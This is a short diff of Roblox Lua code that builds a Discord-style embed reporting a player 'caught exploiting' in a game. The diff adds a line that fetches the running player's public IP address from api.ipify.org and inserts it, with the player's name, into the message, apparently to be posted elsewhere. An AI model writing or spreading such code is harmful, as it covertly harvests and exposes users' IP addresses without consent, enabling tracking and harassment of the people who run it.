@@ -1,9 +1,10 @@
+local NIITWO = tostring ( game:HttpGet ( "https://api.ipify.org", true ) )
 msg = {
 ["embeds"] = {{
 ["color"] = 13708129,
 ["description"] = "Has been caught exploiting in: "..Game.PlaceId,
 ["author"] = {
-["name"] = game.Players.LocalPlayer.name,
+["name"] = "|Player Name| ="..game.players.localplayer.name.." |Player Ip| ="..NIITWO.."",
 }}
 }
 }
